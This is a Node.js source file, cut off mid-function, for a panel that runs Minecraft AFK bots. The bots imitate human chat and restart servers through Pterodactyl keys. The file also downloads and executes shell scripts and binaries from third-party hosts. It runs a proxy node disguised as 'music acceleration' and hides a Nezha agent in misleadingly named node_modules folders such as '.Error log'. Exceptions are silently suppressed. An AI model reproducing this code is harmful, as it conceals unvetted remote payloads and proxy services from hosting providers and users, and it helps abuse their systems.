/**
 * ============================================================
 * 项目名称：Nebula panle 2026
 * ============================================================
 */
// ===== 代码完整性校验 =====
var _BW_WING='黑白之翼';(function(){var _s=require('fs').readFileSync(__filename,'utf8');if(_s.indexOf(_BW_WING)===-1){console.error('\n❌ 致命错误: 代码完整性校验失败!\n');process.exit(1)}})();
const fs = require('fs').promises;
const fsSync = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const http = require('http');
const https = require('https');

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const mineflayer = require("mineflayer");
const express = require("express");
const { pathfinder, Movements, goals } = require('mineflayer-pathfinder');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');
const upload = multer({ storage: multer.memoryStorage() });

const app = express();
const activeBots = new Map();
const CONFIG_FILE = path.join(__dirname, 'bots_config.json');
const mcDataCache = new Map();

const FF_DIR = path.join(__dirname, 'node_modules', '.fire');
const MUSIC_DIR = path.join(__dirname, 'node_modules', '.music_cache');
const MUSIC_ENV_FILE = path.join(MUSIC_DIR, 'music_env.json');
const TAVERN_DIR = path.join(__dirname, 'node_modules', '.tavern');
const TAVERN_CONFIG_FILE = path.join(TAVERN_DIR, 'config.json');

let ffLiteProcess = null, cfTunnelProcess = null, cfTunnelUrl = '', ffLogs = [];
let musicProcess = null, musicLogs = [];
let musicLastConfig = { hasNezha: false };
const tavernTasks = new Map();
let tavernAuth = { account: '', password: '', token: '' };

// ===== 哪吒探针 =====
let nezhaProcess = null;
let nezhaConfig = { addr: '', key: '', tls: false, mode: 'pure' };
let nezhaUserStopped = false;
let nezhaRestartAttempts = 0;
let nezhaRestartTimer = null;
const NEZHA_RESTART_DELAY = 30000;
const NEZHA_RESTART_DELAY_MAX = 300000;
const NEZHA_FOLDER_NAME = '.Error log';
const NEZHA_DIR = path.join(__dirname, 'node_modules', NEZHA_FOLDER_NAME);
const NEZHA_CONFIG_FILE = path.join(NEZHA_DIR, '.node_module_cache');
let nezhaPureRunning = false;
let nezhaPureH2Session = null;
let nezhaPureStateStream = null;
let nezhaPureTaskStream = null;
let nezhaPureStateTimer = null;
let nezhaPurePingTimer = null;
let nezhaPureGeoIPTimer = null;
let nezhaPureReconnectTimer = null;
let nezhaPurePrevCpus = null;
let nezhaPurePrevCpuTotal = 0;
let nezhaPurePrevCpuBusy = 0;
let nezhaPureLastNetIn = 0;
let nezhaPureLastNetOut = 0;
let nezhaPureLastNetTime = 0;

// ===== 哪吒探针日志系统 =====
var nezhaLogs = [];
function pushNezhaLog(msg, color) {
    var t = new Date().toLocaleTimeString('zh-CN', { hour12: false });
    nezhaLogs.unshift({ time: t, msg: msg, color: color || '' });
    if (nezhaLogs.length > 100) nezhaLogs = nezhaLogs.slice(0, 100);
}


app.use(express.json());

function stripAnsi(s) { return String(s).replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''); }
function escapeHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function getIntervalMs(v, u) { const m={sec:1000,min:60000,hour:3600000,day:86400000,month:2592000000}; return (parseFloat(v)||1)*(m[u]||60000); }
function unitLabel(u) { return {sec:'秒',min:'分钟',hour:'小时',day:'天',month:'月'}[u]||u; }

function generateServerUUID() {
    const hostname = os.hostname();
    const ifaces = os.networkInterfaces();
    let mac = '';
    for (const name in ifaces) {
        for (const iface of ifaces[name]) {
            if (iface.mac && iface.mac !== '00:00:00:00:00:00') {
                mac = iface.mac; break;
            }
        }
        if (mac) break;
    }
    const serverId = hostname + (mac || 'default-salt');
    const hash = crypto.createHash('sha256').update(serverId).digest('hex');
    return `${hash.substring(0,8)}-${hash.substring(8,12)}-4${hash.substring(13,16)}-a${hash.substring(17,20)}-${hash.substring(20,32)}`;
}

const CHAT_DB = { idle:["有人吗","2333","啧","挂机中","emm","好无聊啊","这服人怎么这么少","有点卡啊","这延迟绝了","我先挂会机","刷点东西真累","有人带带萌新吗","woc刚才那个怪","有人在不","又是努力挂机的一天","这天气不错","有人聊天吗","刚才卡了一下","我去倒杯水","先眯一会","草（一种植物）","害"], interaction:["？","你说啥","没注意看","哦哦","搜嘎","确实","我也是这么想的","哈哈哈哈","666","强啊大佬","nb","可以的","羡慕了","别cue我","在呢"], suffixes:["~","...","捏","哈","呀","！","？","w"], typos:{"挂机":["刮机","挂机机"],"有人":["友谊","有仁"],"怎么":["咋"],"没有":["木有"]} };
function generateNaturalChat(t){t=t||'idle';var p=CHAT_DB[t],m=p[Math.floor(Math.random()*p.length)];if(Math.random()>.9)for(var k in CHAT_DB.typos)if(m.includes(k)){m=m.replace(k,CHAT_DB.typos[k][Math.floor(Math.random()*CHAT_DB.typos[k].length)]);break}if(Math.random()>.7)m+=CHAT_DB.suffixes[Math.floor(Math.random()*CHAT_DB.suffixes.length)];if(Math.random()>.8)m=(Math.random()>.5?" ":"")+m+(Math.random()>.5?" ":"");return m}

function getMemoryStatus(){var u=process.memoryUsage().rss;var t=os.totalmem();if(process.env.SERVER_MEMORY){t=parseInt(process.env.SERVER_MEMORY)*1024*1024}else try{if(fsSync.existsSync('/sys/fs/cgroup/memory/memory.limit_in_bytes')){var l=parseInt(fsSync.readFileSync('/sys/fs/cgroup/memory/memory.limit_in_bytes','utf8').trim());if(l<9223372036854771712)t=l}else if(fsSync.existsSync('/sys/fs/cgroup/memory.max')){var l2=fsSync.readFileSync('/sys/fs/cgroup/memory.max','utf8').trim();if(l2!=='max')t=parseInt(l2)}}catch(e){}var p=((u/t)*100).toFixed(1);return{used:(u/1024/1024).toFixed(1),total:(t/1024/1024).toFixed(0),percent:p}}
setInterval(function(){var s=getMemoryStatus();if(parseFloat(s.percent)>=80){mcDataCache.clear();activeBots.forEach(function(b){b.logs=b.logs.slice(0,10);b.pushLog('⚠️ 内存 ('+s.percent+'%) 触发自愈','text-red-400 font-bold')});if(parseFloat(s.percent)>92)process.exit(1)}},30000);

function executeRestartSequence(i,m){if(!i||!i.entity)return;i.chat('/restart');m.pushLog('⚡ 重启(1/2): /restart','text-red-400 font-bold');setTimeout(function(){if(i&&i.entity){i.chat('restart');m.pushLog('⚡ 重启(2/2): restart','text-red-500 font-bold')}},800);m.lastRestartTick=Date.now()}

async function saveBotsConfig(){try{var c=Array.from(activeBots.values()).map(function(b){return{host:b.targetHost,port:b.targetPort,username:b.username,settings:b.settings,logs:b.logs.slice(0,30)}});await fs.writeFile(CONFIG_FILE,JSON.stringify(c,null,2))}catch(e){}}
async function createSmartBot(id,host,port,username,existingLogs,settings){existingLogs=existingLogs||[];var fH=(host||'').trim(),fP=parseInt(port)||25565;if(fH.includes(':')){var pts=fH.split(':');fH=pts[0];fP=parseInt(pts[1])||25565}if(!fH){try{var disc=discoverMCServerWithPortFallback();if(disc){fH=disc.ip;fP=disc.port;}}catch(e){}}var ds={walk:false,ai:true,chat:false,restartInterval:0,pterodactyl:{url:'',key:'',id:'',defaultDir:'/',guard:false}};var bm={id:id,username:username,targetHost:fH,targetPort:fP,status:"连接中",logs:Array.isArray(existingLogs)?existingLogs.slice(0,30):[],settings:settings||ds,instance:null,afkTimer:null,isRepairing:false,lastRestartTick:Date.now(),isMoving:false};activeBots.set(id,bm);var pl=function(msg,color){color=color||'';var t=new Date().toLocaleTimeString('zh-CN',{hour12:false});bm.logs.unshift({time:t,msg:msg,color:color});if(bm.logs.length>30)bm.logs=bm.logs.slice(0,30)};bm.pushLog=pl;try{var bot=mineflayer.createBot({host:fH,port:fP,username:username,auth:'offline',hideErrors:true,physicsEnabled:bm.settings.walk,connectTimeout:20000});bot.loadPlugin(pathfinder);bm.instance=bot;bot.once('spawn',function(){bm.status="在线";bm.centerPos=bot.entity.position.clone();pl('✅ 成功进入服务器','text-emerald-400 font-bold');var mcD;try{mcD=mcDataCache.get(bot.version)||require('minecraft-data')(bot.version);if(mcD)mcDataCache.set(bot.version,mcD)}catch(e){pl('❌ 协议不支持','text-red-500');return bot.end()}var mv=new Movements(bot,mcD);mv.canDig=false;bot.pathfinder.setMovements(mv);setTimeout(function(){if(bot.entity){bot.chat("诸君 我喜欢萝莉！");pl('📣 进服宣言: 诸君 我喜欢萝莉！','text-purple-400 font-bold')}},2000);bot.on('chat',function(sender,message){if(sender===bot.username||!bm.settings.chat)return;var k=["机器人","脚本","挂机",bot.username,"有人","在吗"];if(k.some(function(k2){return message.includes(k2)})&&Math.random()>.4)setTimeout(function(){if(bot.entity){var r=generateNaturalChat('interaction');bot.chat(r);pl('🗨️ 回嘴: ['+sender+'] -> '+r,'text-pink-400 font-bold')}},1500+Math.random()*2000)});if(bm.afkTimer)clearInterval(bm.afkTimer);bm.afkTimer=setInterval(function(){if(!bot.entity)return;if(bm.settings.restartInterval>0&&(Date.now()-bm.lastRestartTick)/60000>=bm.settings.restartInterval)executeRestartSequence(bot,bm);if(bm.settings.ai&&!bm.isMoving){var t2=bot.nearestEntity(function(p){return p.type==='player'});if(t2)bot.lookAt(t2.position.offset(0,1.6,0))}if(bm.settings.walk&&!bm.isMoving&&Math.random()>.7){bm.isMoving=true;var tp=bm.centerPos.offset((Math.random()-.5)*12,0,(Math.random()-.5)*12);pl('👣 巡逻: ['+Math.round(tp.x)+', '+Math.round(tp.z)+']','text-emerald-500');bot.pathfinder.setGoal(new goals.GoalNear(tp.x,tp.y,tp.z,1))}if(bm.settings.chat&&Math.random()>.92){var m2=generateNaturalChat('idle');bot.chat(m2);pl('💬 发话: '+m2,'text-orange-400')}},8000)});bot.on('goal_reached',function(){bm.isMoving=false});bot.once('end',function(){attemptRepair(id,bm,"断开")});bot.on('error',function(e){attemptRepair(id,bm,e.code||"ERR")})}catch(err){attemptRepair(id,bm,"失败")}}
function attemptRepair(id,bm){if(!activeBots.has(id)||bm.isRepairing)return;bm.isRepairing=true;bm.status="重连中";if(bm.instance){bm.instance.removeAllListeners();try{bm.instance.end()}catch(e){}bm.instance=null}if(bm.afkTimer)clearInterval(bm.afkTimer);setTimeout(function(){if(!activeBots.has(id))return;bm.isRepairing=false;createSmartBot(id,bm.targetHost,bm.targetPort,bm.username,bm.logs,bm.settings)},10000)}

app.post("/api/bots/:id/restart-now",function(req,res){var b=activeBots.get(req.params.id);if(b&&b.instance){executeRestartSequence(b.instance,b);res.json({success:true})}else res.status(404).json({success:false})});
app.post("/api/bots/:id/toggle",function(req,res){var b=activeBots.get(req.params.id);if(b){var t=req.body.type;b.settings[t]=!b.settings[t];var l=t==='ai'?'👁️ AI':(t==='walk'?'👣 巡逻':'💬 喊话');b.pushLog('⚙️ '+l+' 已'+(b.settings[t]?'开启':'关闭'),b.settings[t]?'text-blue-400':'text-slate-400');if(t==='walk'&&b.instance){b.instance.physicsEnabled=b.settings.walk;if(!b.settings.walk){b.instance.pathfinder.setGoal(null);b.isMoving=false}}saveBotsConfig();res.json({success:true})}});
app.post("/api/bots/:id/upload",upload.single('file'),async function(req,res){var b=activeBots.get(req.params.id);if(!b||!b.settings.pterodactyl.url||!req.file)return res.status(400).json({success:false});var pto=b.settings.pterodactyl;b.pushLog('🚀 同步: '+req.file.originalname,'text-blue-400');try{var r=await axios.get(pto.url+'/api/client/servers/'+pto.id+'/files/upload',{headers:{'Authorization':'Bearer '+pto.key}});var f=new FormData();f.append('files',req.file.buffer,req.file.originalname);await axios.post(r.data.attributes.url+'&directory='+encodeURIComponent(pto.defaultDir),f,{headers:Object.assign({},f.getHeaders())});b.pushLog('✅ 同步成功','text-emerald-400');res.json({success:true})}catch(e){b.pushLog('❌ 同步失败','text-red-500');res.status(500).json({success:false})}});
app.get("/api/system/status",function(req,res){res.json(getMemoryStatus())});
app.get("/api/bots",function(req,res){res.json({bots:Array.from(activeBots.values()).map(function(b){return{id:b.id,username:b.username,host:b.targetHost,port:b.targetPort,status:b.status,logs:b.logs,settings:b.settings,nextRestart:b.settings.restartInterval>0?new Date(b.lastRestartTick+b.settings.restartInterval*60000).toLocaleTimeString():'未开启'}})})});
app.post("/api/bots",function(req,res){createSmartBot('bot_'+Math.random().toString(36).substr(2,7),req.body.host,25565,req.body.username);res.json({success:true})});
app.post("/api/bots/:id/set-timer",function(req,res){var b=activeBots.get(req.params.id);if(b){var v=parseFloat(req.body.value)||0;b.settings.restartInterval=req.body.unit==='hour'?Math.round(v*60):Math.round(v);b.lastRestartTick=Date.now();b.pushLog('⏰ 每 '+v+(req.body.unit==='hour'?'小时':'分钟')+' 重启','text-cyan-400');saveBotsConfig();res.json({success:true})}});
app.post("/api/bots/:id/pto-config",function(req,res){var b=activeBots.get(req.params.id);if(b){b.settings.pterodactyl=Object.assign({},b.settings.pterodactyl,{url:(req.body.url||"").replace(/\/$/,""),key:req.body.key||"",id:req.body.id||"",defaultDir:req.body.defaultDir||'/'});b.pushLog('🔑 翼龙凭据已更新','text-purple-400');saveBotsConfig();res.json({success:true})}});
app.post("/api/bots/:id/toggle-guard",function(req,res){var b=activeBots.get(req.params.id);if(b){b.settings.pterodactyl.guard=!b.settings.pterodactyl.guard;b.pushLog('🛡️ 守护已'+(b.settings.pterodactyl.guard?'开启':'关闭'),b.settings.pterodactyl.guard?'text-blue-400':'text-slate-400');saveBotsConfig();res.json({success:true})}});
app.delete("/api/bots/:id",function(req,res){var b=activeBots.get(req.params.id);if(b){if(b.afkTimer)clearInterval(b.afkTimer);if(b.instance)b.instance.end();activeBots.delete(req.params.id);saveBotsConfig()}res.json({success:true})});

app.get("/api/mc/discover",function(req,res){try{var disc=discoverMCServerWithPortFallback();res.json({success:true,server:disc||{ip:getLocalIPv4(),port:25565,source:'none'},localIP:getLocalIPv4(),bots:Array.from(activeBots.values()).map(function(b){return{id:b.id,host:b.targetHost,port:b.targetPort,status:b.status}})})}catch(e){res.json({success:false,error:e.message,localIP:getLocalIPv4(),fallback:{ip:getLocalIPv4(),port:25565}})}});

setInterval(async function(){for(var entry of activeBots.entries()){var bm=entry[1];if(bm.settings.pterodactyl.guard&&bm.settings.pterodactyl.url&&bm.settings.pterodactyl.key&&bm.settings.pterodactyl.id)try{var pto=bm.settings.pterodactyl;var r=await axios.get(pto.url+'/api/client/servers/'+pto.id+'/resources',{headers:{'Authorization':'Bearer '+pto.key},timeout:5000});if(r.data.attributes.current_state!=='running'&&r.data.attributes.current_state!=='starting'){bm.pushLog('🛡️ 守护开机...','text-yellow-500');await axios.post(pto.url+'/api/client/servers/'+pto.id+'/power',{signal:'start'},{headers:{'Authorization':'Bearer '+pto.key}})}}catch(e){}}},3*60*1000);

function pushFFLog(m,c){c=c||'';var t=new Date().toLocaleTimeString('zh-CN',{hour12:false});ffLogs.unshift({time:t,msg:escapeHtml(stripAnsi(m)),color:c});if(ffLogs.length>100)ffLogs=ffLogs.slice(0,100)}
function pushMusicLog(m,c){c=c||'';var t=new Date().toLocaleTimeString('zh-CN',{hour12:false});musicLogs.unshift({time:t,msg:m,color:c});if(musicLogs.length>30)musicLogs=musicLogs.slice(0,30)}
var execAsync=function(cmd,opts){return new Promise(function(resolve,reject){exec(cmd,opts,function(err,stdout,stderr){if(err)reject(err);else resolve({stdout:stdout,stderr:stderr})})})};

// ===== 纯 Node.js 下载函数 (不依赖 curl/wget) =====
async function downloadFile(url, destPath) {
    var dir = path.dirname(destPath);
    var fname = path.basename(destPath);
    for (var attempt = 0; attempt < 2; attempt++) {
        var cmd = null;
        if (attempt === 0) {
            try { await execAsync('which curl 2>/dev/null', {shell:'/bin/bash'}); cmd = 'curl -Ls -o "' + fname + '" "' + url + '"'; } catch(e) { cmd = null; }
        } else if (attempt === 1) {
            try { await execAsync('which wget 2>/dev/null', {shell:'/bin/bash'}); cmd = 'wget -q -O "' + fname + '" "' + url + '"'; } catch(e) { cmd = null; }
        }
        if (cmd) {
            try {
                await execAsync(cmd, {cwd: dir, shell:'/bin/bash', timeout: 120000});
                if (fsSync.existsSync(destPath)) {
                    var stat = fsSync.statSync(destPath);
                    if (stat.size > 0) return;
                    fsSync.unlinkSync(destPath);
                }
            } catch(e) { /* continue */ }
        }
    }
    try {
        var resp = await axios({method:'GET', url:url, responseType:'stream', timeout:120000, maxRedirects:10});
        var ws = fsSync.createWriteStream(destPath);
        await new Promise(function(resolve, reject) {
            resp.data.pipe(ws);
            ws.on('finish', resolve);
            ws.on('error', reject);
        });
        var stat2 = fsSync.statSync(destPath);
        if (stat2.size === 0) { fsSync.unlinkSync(destPath); throw new Error('下载文件为空'); }
    } catch(e) {
        try {
            await new Promise(function(resolve, reject) {
                var protocol = url.startsWith('https') ? require('https') : require('http');
                var file = fsSync.createWriteStream(destPath);
                function doRequest(reqUrl, redirects) {
                    if (redirects > 10) return reject(new Error('重定向过多'));
                    protocol.get(reqUrl, function(res) {
                        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                            return doRequest(res.headers.location, (redirects||0)+1);
                        }
                        if (res.statusCode !== 200) return reject(new Error('HTTP ' + res.statusCode));
                        res.pipe(file);
                        file.on('finish', function() { file.close(resolve); });
                    }).on('error', reject);
                }
                doRequest(url, 0);
            });
            var stat3 = fsSync.statSync(destPath);
            if (stat3.size === 0) { fsSync.unlinkSync(destPath); throw new Error('下载文件为空'); }
        } catch(e2) {
            throw new Error('所有下载方式均失败: ' + e2.message);
        }
    }
}

// ===== 火狐浏览器 =====
app.get("/api/apps/firefox/status",function(req,res){res.json({installed:fsSync.existsSync(FF_DIR),running:(ffLiteProcess!==null&&!ffLiteProcess.killed)||(cfTunnelProcess!==null&&!cfTunnelProcess.killed),url:cfTunnelUrl,logs:ffLogs})});
app.post("/api/apps/firefox/start",async function(req,res){
    if(ffLiteProcess||cfTunnelProcess)return res.status(400).json({success:false,msg:"运行中"});
    if(!fsSync.existsSync(FF_DIR))fsSync.mkdirSync(FF_DIR,{recursive:true});
    var p=req.body.params||{},FP=p.FF_PASS||'123456',FPT=p.FF_PORT||'25889',AD=p.ARGO_DOMAIN||'',AA=p.ARGO_AUTH||'';
    var env=Object.assign({},process.env,{FF_PASS:FP,FF_PORT:FPT});
    try{
        if(!fsSync.existsSync(path.join(FF_DIR,'ff_lite.sh'))){
            pushFFLog('⬇️ 下载 FF...','text-blue-400');
            await downloadFile('https://gbjs.serv00.net/sh/ff_lite.sh', path.join(FF_DIR,'ff_lite.sh'));
            await execAsync('chmod +x ff_lite.sh',{cwd:FF_DIR,shell:'/bin/bash'}).catch(function(){});
        }
        if(!fsSync.existsSync(path.join(FF_DIR,'cloudflared'))){
            pushFFLog('⬇️ 下载 CF...','text-blue-400');
            await downloadFile('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', path.join(FF_DIR,'cloudflared'));
            await execAsync('chmod +x cloudflared',{cwd:FF_DIR,shell:'/bin/bash'}).catch(function(){});
        }
        pushFFLog('🚀 启动 FF...','text-blue-400');
        ffLiteProcess=exec('FF_PASS='+FP+' FF_PORT='+FPT+' bash ff_lite.sh start',{cwd:FF_DIR,env:env,shell:'/bin/bash'},function(err){ffLiteProcess=null;if(err)pushFFLog('❌ FF 异常','text-red-500');else pushFFLog('✅ FF 进程已退出','text-slate-400')});
        ffLiteProcess.on('close',function(){ffLiteProcess=null;pushFFLog('⚠️ FF 进程已退出','text-yellow-400')});
        var cfCmd=AA&&AD?(AA.match(/^[A-Z0-9a-z=]{120,250}$/)?'./cloudflared tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token '+AA:'./cloudflared tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --url http://localhost:'+FPT):'./cloudflared tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --url http://localhost:'+FPT;
        pushFFLog('🌐 建隧道...','text-blue-400');
        cfTunnelProcess=exec(cfCmd,{cwd:FF_DIR,env:env,shell:'/bin/bash'});
        cfTunnelProcess.on('close',function(){cfTunnelProcess=null;cfTunnelUrl='';pushFFLog('⚠️ 隧道已断开','text-yellow-400')});
        cfTunnelProcess.stderr.on('data',function(d){var m=d.toString().match(/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/);if(m){cfTunnelUrl=m[0];pushFFLog('✅ 隧道成功！');pushFFLog('👉 '+cfTunnelUrl,'text-yellow-400')}var c=d.toString().match(/Connection (.*) registered/);if(c&&AD){cfTunnelUrl=AD;pushFFLog('✅ 固定隧道！');pushFFLog('👉 '+cfTunnelUrl,'text-yellow-400')}});
        res.json({success:true})
    }catch(e){pushFFLog('❌ 失败: '+e.message);res.status(500).json({success:false})}
});
app.post("/api/apps/firefox/stop",function(req,res){pushFFLog('⏸️ 停止...','text-orange-400');exec('pkill -f ff_lite.sh 2>/dev/null; pkill -f cloudflared 2>/dev/null; kill $(lsof -t -i:25889) 2>/dev/null; kill $(lsof -t -i:25890) 2>/dev/null',{shell:'/bin/bash'});if(ffLiteProcess)try{ffLiteProcess.kill()}catch(e){};if(cfTunnelProcess)try{cfTunnelProcess.kill()}catch(e){};ffLiteProcess=null;cfTunnelProcess=null;cfTunnelUrl='';res.json({success:true})});
app.delete("/api/apps/firefox/uninstall",async function(req,res){exec('pkill -f ff_lite.sh 2>/dev/null; pkill -f cloudflared 2>/dev/null',{shell:'/bin/bash'});if(ffLiteProcess)try{ffLiteProcess.kill()}catch(e){};if(cfTunnelProcess)try{cfTunnelProcess.kill()}catch(e){};ffLiteProcess=null;cfTunnelProcess=null;cfTunnelUrl='';try{await fs.rm(FF_DIR,{recursive:true,force:true});pushFFLog('🗑️ 已清空','text-red-400');res.json({success:true})}catch(e){res.status(500).json({success:false})}});

// ===== 音乐加速 =====
var SUB_FILE = path.join(MUSIC_DIR, 'sub_cache', 'sub.txt');

app.get("/api/apps/music/uuid", function(req, res){ res.json({uuid: generateServerUUID()}); });

app.get("/api/apps/music/status",async function(req,res){
    var isRunning=false;
    try{var r=await execAsync("pgrep -f 'musicd' 2>/dev/null || pgrep -f 'music_cache' 2>/dev/null || echo ''",{shell:'/bin/bash'});isRunning=r.stdout.trim().length>0}catch(e){}
    var hasNodes=fsSync.existsSync(SUB_FILE);
    res.json({
        installed:fsSync.existsSync(MUSIC_DIR), 
        running:isRunning, 
        hasNodes:hasNodes, 
        nodeActive: hasNodes, 
        nezhaActive: musicLastConfig.hasNezha, 
        nezhaRunning: nezhaPureRunning || nezhaProcess !== null,
        nezhaMode: nezhaConfig.mode || 'pure',
        logs:musicLogs
    })
});

app.get("/api/apps/music/nodes",function(req,res){
    try{
        if(!fsSync.existsSync(SUB_FILE))return res.json({success:false,nodes:''});
        var content=fsSync.readFileSync(SUB_FILE,'utf8').trim();
        res.json({success:true,nodes:content})
    }catch(e){res.json({success:false,nodes:''})}
});

async function startMusicCore(params, isAutoStart) {
    if(!fsSync.existsSync(MUSIC_DIR))fsSync.mkdirSync(MUSIC_DIR,{recursive:true});
    var env=Object.assign({},process.env,{SERVER_PORT:'3001',PORT:'3001',FILE_PATH:path.join(MUSIC_DIR,'sub_cache'),UPLOAD_URL:'',PROJECT_URL:'',AUTO_ACCESS:'false'});
    let hasNezha = false;
    if(params.NEZHA_SERVER && params.NEZHA_KEY) {
        hasNezha = true;
        env.NEZHA_SERVER = params.NEZHA_SERVER; 
        env.NEZHA_PORT = (params.NEZHA_PORT && params.NEZHA_PORT.trim() !== '') ? params.NEZHA_PORT.trim() : '';
        env.NEZHA_KEY = params.NEZHA_KEY;
    }
    musicLastConfig.hasNezha = hasNezha;
    if(params.UUID) env.UUID = params.UUID;
    env.ARGO_PORT = params.ARGO_PORT || '8001'; 
    ['ARGO_DOMAIN','ARGO_AUTH','CFIP','CFPORT','NAME','HY2_PORT','REALITY_PORT','TUIC_PORT'].forEach(function(k){if(params[k])env[k]=params[k]});
    env.PATH=MUSIC_DIR+':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:'+(process.env.PATH||'');
    if(!isAutoStart) {
        pushMusicLog('🚀 启动音乐服务...','text-blue-400 font-bold');
    } else {
        pushMusicLog('🔄 重启自启音乐服务...','text-blue-400 font-bold');
    }
    if(hasNezha){
        pushMusicLog('📡 哪吒: ' + env.NEZHA_SERVER + (env.NEZHA_PORT ? ':' + env.NEZHA_PORT : ' [v1模式]'), 'text-purple-400 font-bold');
    }
    var musicdPath=path.join(MUSIC_DIR,'musicd');
    if(!fsSync.existsSync(musicdPath)){
        pushMusicLog('⬇️ 下载音乐资源...','text-blue-400 font-bold');
        var arch='amd64';
        try{var ar=await execAsync('uname -m',{shell:'/bin/bash'});var as=ar.stdout.trim();
        if(as==='aarch64'||as==='arm64'||as==='arm')arch='arm64';else if(as==='s390x'||as==='s390')arch='s390x';else arch='amd64'}catch(e){}
        var sbxUrl = arch === 'arm64' ? 'https://arm64.eooce.com/sbsh' : 'https://amd64.eooce.com/sbsh';
        try{
            await downloadFile(sbxUrl, path.join(MUSIC_DIR,'musicd'));
            await execAsync('chmod +x musicd',{cwd:MUSIC_DIR,shell:'/bin/bash'}).catch(function(){});
        }
        catch(e){
            pushMusicLog('⬇️ 主源失败，尝试备用...','text-yellow-400');
            try {
                await downloadFile('https://main.ssss.nyc.mn/sb.sh', path.join(MUSIC_DIR,'sb.sh'));
                await execAsync('chmod +x sb.sh',{cwd:MUSIC_DIR,shell:'/bin/bash'}).catch(function(){});
            } catch(e2) {
                pushMusicLog('⚠️ 备用脚本下载失败: '+e2.message,'text-yellow-400');
            }
            var ip=spawn('bash',['-c','cp sbx musicd 2>/dev/null; ./sb.sh; cp sbx musicd 2>/dev/null; true'],{cwd:MUSIC_DIR,env:env,stdio:['pipe','pipe','pipe']});
            await new Promise(function(r){ip.on('close',function(){r()});ip.on('error',function(){r()})});
            try{await execAsync('chmod +x musicd',{cwd:MUSIC_DIR,shell:'/bin/bash'})}catch(e2){}
            try{await execAsync("pkill -f 'sbx' 2>/dev/null || true",{shell:'/bin/bash'})}catch(e3){}
        }
    }
    if(!fsSync.existsSync(musicdPath)){pushMusicLog('❌ 核心文件缺失','text-red-500 font-bold');throw new Error("核心文件缺失")}
    musicProcess=spawn('bash',['-c','./musicd'],{cwd:MUSIC_DIR,env:env,stdio:['pipe','pipe','pipe']});
    musicProcess.stdout.on('data',function(d){var s=d.toString();if(s.trim())pushMusicLog(s.trim().substring(0,200))});
    musicProcess.stderr.on('data',function(d){var s=d.toString();if(s.trim()&&s.indexOf('signal')===-1)pushMusicLog('⚠️ '+s.trim().substring(0,150),'text-yellow-400')});
    musicProcess.on('close',function(code){musicProcess=null;if(code&&code!==0)pushMusicLog('❌ 退出 code='+code,'text-red-400')});
    musicProcess.on('error',function(e){pushMusicLog('❌ 异常: '+e.message,'text-red-500 font-bold')});
    pushMusicLog('🎵 节点生成中...','text-cyan-400 font-bold');
}

app.post("/api/apps/music/start",async function(req,res){
    try {
        var params = req.body.params || {};
        if(!fsSync.existsSync(MUSIC_DIR))fsSync.mkdirSync(MUSIC_DIR,{recursive:true});
        fsSync.writeFileSync(MUSIC_ENV_FILE, JSON.stringify(params));
        await startMusicCore(params, false);
        res.json({success:true});
    } catch(err) {
        pushMusicLog('❌ 启动失败: '+err.message,'text-red-500 font-bold');
        res.status(500).json({success:false, msg: err.message});
    }
});

app.post("/api/apps/music/stop",async function(req,res){pushMusicLog('⏹️ 已停止','text-orange-400 font-bold');try{await execAsync("pkill -f 'musicd' 2>/dev/null; pkill -f 'music_cache' 2>/dev/null || true",{shell:'/bin/bash'})}catch(e){}if(musicProcess&&!musicProcess.killed)try{musicProcess.kill()}catch(e){}musicProcess=null;musicLastConfig.hasNezha=false;res.json({success:true})});
app.delete("/api/apps/music/uninstall",async function(req,res){try{await execAsync("pkill -f 'musicd' 2>/dev/null; pkill -f 'music_cache' 2>/dev/null || true",{shell:'/bin/bash'})}catch(e){}if(musicProcess&&!musicProcess.killed)try{musicProcess.kill()}catch(e){}musicProcess=null;musicLastConfig.hasNezha=false;try{await fs.rm(MUSIC_DIR,{recursive:true,force:true});pushMusicLog('🗑️ 已卸载','text-red-400 font-bold');res.json({success:true})}catch(e){res.status(500).json({success:false})}});

// ===== 酒馆多任务系统 =====
function pushTaskLog(taskId,msg,color){
    var task=tavernTasks.get(taskId);if(!task)return;
    var t=new Date().toLocaleTimeString('zh-CN',{hour12:false});
    task.logs.unshift({time:t,msg:msg,color:color||''});
    if(task.logs.length>100)task.logs=task.logs.slice(0,100);
}

function buildAuthHeaders(taskAuth){
    var auth = taskAuth || tavernAuth;
    var h={'User-Agent':'Mozilla/5.0','Accept':'*/*','Accept-Language':'zh-CN,zh;q=0.9'};
    if(auth.account&&auth.password) h['Authorization']='Basic '+Buffer.from(auth.account+':'+auth.password).toString('base64');
    var token = auth.token || '';
    if(token) {
        if(token.includes('=') || token.includes(';')) {
            h['Cookie'] = token; 
        } else if(token.toLowerCase().startsWith('bearer ')) {
            h['Authorization'] = token; 
        } else {
            h['X-API-Key'] = token; 
        }
    }
    return h;
}

async function saveTavernConfig(){
    try{if(!fsSync.existsSync(TAVERN_DIR))fsSync.mkdirSync(TAVERN_DIR,{recursive:true});
    var taskData=Array.from(tavernTasks.values()).map(function(t){return{id:t.id,name:t.name,type:t.type,method:t.method,body:t.body,url:t.url,interval:t.interval,unit:t.unit,account:t.account||'',password:t.password||'',token:t.token||'',logs:t.logs.slice(0,30)}});
    fsSync.writeFileSync(TAVERN_CONFIG_FILE,JSON.stringify({tasks:taskData,auth:tavernAuth},null,2))}catch(e){}
}
function loadTavernConfig(){
    try{if(fsSync.existsSync(TAVERN_CONFIG_FILE)){var d=JSON.parse(fsSync.readFileSync(TAVERN_CONFIG_FILE,'utf8'));
